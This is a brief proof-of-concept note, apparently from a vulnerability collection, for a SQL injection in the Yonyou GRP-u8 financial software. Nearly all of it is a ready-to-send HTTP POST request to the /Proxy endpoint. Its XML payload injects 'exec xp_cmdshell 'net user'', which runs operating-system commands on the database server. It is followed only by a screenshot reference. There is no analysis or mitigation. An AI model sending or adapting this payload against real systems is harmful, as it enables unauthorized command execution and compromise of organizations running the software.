# 用友GRP-u8 SQL注入

```
POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET
version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRe
quest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA
format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME
><DATA format="text">exec xp_cmdshell 'net
user'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

![image-20201020120505719](resource/%E7%94%A8%E5%8F%8BGRP-u8%20SQL%E6%B3%A8%E5%85%A5/media/image-20201020120505719.png)